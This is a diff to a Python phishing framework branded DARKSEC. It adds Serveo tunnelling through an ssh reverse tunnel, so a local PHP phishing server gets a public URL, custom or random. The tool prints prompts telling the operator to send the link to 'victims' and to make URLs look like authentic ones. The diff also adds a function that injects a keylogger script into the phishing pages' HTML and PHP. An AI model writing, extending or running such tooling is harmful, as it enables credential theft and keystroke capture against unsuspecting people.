@@ -113,18 +113,38 @@ def runNgrok():
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ ATTACK IS IN PROGRESS ]{1}!! {0}\n-------------------------------\n\n\n {0}[{1}*{0}]{1} Ngrok URL: {2}'''.format(RED, DEFAULT, GREEN) + url + '''{1}'''.format(RED, DEFAULT, GREEN))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ ATTACK IS IN PROGRESS ]{1}!! {0}\n-------------------------------\n\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111 \n{0}[{1}*{0}]{1} Ngrok URL: {2}'''.format(RED, DEFAULT, GREEN) + url + '''{1}'''.format(RED, DEFAULT, GREEN))
            
             break
-
+            
 def runServeo():
+        print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Custom Url's generating Can irritate you.\n{0}[{1}!{0}]{1}As the Serveo becomes popular, Getting a desired domain may be tough. ''').format(RED, DEFAULT)) 
+        print(_("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}").format(RED, DEFAULT))
+        print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates desired url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(RED, DEFAULT))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {1}".format(RED, DEFAULT))
+        system('clear')
+        if choice == '1':
+            
+            customServeo()
+        elif choice == '2':
+            randomServeo()
+        else:
+            system('clear')
+            return runServeo()
+	
+def customServeo():
 	
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n\n\n{0}[{1}!{0}]{1}[ YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL's ]\n{0}[{1}!{0}]{1}Again ? Use Your Social-engineering Skills Here.\n\n\n{0}Insert a custom subdomain for serveo''').format(RED, DEFAULT))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1}[ YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL's ]\n{0}[{1}!{0}]{1}Again ? Use Your Social-engineering Skills Here.\n\n\n{0}Insert a custom subdomain for serveo''').format(RED, DEFAULT))
     lnk = input(_("\n{0}CUSTOM Subdomain>>> {1}").format(RED, DEFAULT))
     if not ".serveo.net" in lnk:
         lnk += ".serveo.net"
@@ -135,7 +155,7 @@ def runServeo():
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
         url = str(output).strip("b ' \ n r")
-        print("\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
+        print("\n{0}[{1}!{0}]{1}SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
         
     except CalledProcessError:
@@ -143,8 +163,28 @@ def runServeo():
 ''').format(RED, DEFAULT))
         sleep(4)
         system('clear')
-        return runServeo()
-
+        return customServeo()
+        
+def randomServeo():
+    system('clear')
+    print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))
+    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
+    sleep(8)
+    try:
+        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
+        url = str(output).strip("b ' \ n r")
+        print("\n{0}[{1}!{0}]{1}SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
+        print("\n")
+    except CalledProcessError: 
+		
+        sleep(4)
+        system('clear')
+        return randomServeo()
 
 def runMainMenu(): #menu where user select what they wanna use
     
@@ -304,14 +344,32 @@ def keyloggerprompt():
 	print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(RED, DEFAULT))      
 
 def addingkeylogger():
-     custom = input(_("\n{1}Do you want to Deploy a Keylogger against Victim{0}(Y/N) \n\n{0}YOUR CHOICE (Y/N) >>> {1}").format(RED, DEFAULT))
-     if 'Y' in custom or 'y' in custom:
+        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)").format(RED, DEFAULT))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {1}".format(RED, DEFAULT))
+        if choice == 'y' or choice == 'Y':
+            
+            addkeylogger()
+        else:
+            system('clear')
+            pass
+	
+
+
+def addkeylogger(): 
+	print(_("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(RED, DEFAULT)) 
+	if path.exists('Server/www/index.html') and path.exists('Server/www/index.php'):          
+         with open('Server/www/index.php') as f:
+             read_data = f.read()
+         c = read_data.replace('</title>', '</title><script src="keylogger.js"></script>')
+         f = open('Server/www/index.php', 'w')
+         f.write(c)
          with open('Server/www/index.html') as f:
              read_data = f.read()
          c = read_data.replace('</title>', '</title><script src="keylogger.js"></script>')
          f = open('Server/www/index.html', 'w')
-         f.write(c)
- 	
+         f.write(c)       
+         sleep(4)      
+         
 def runServer():
     system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
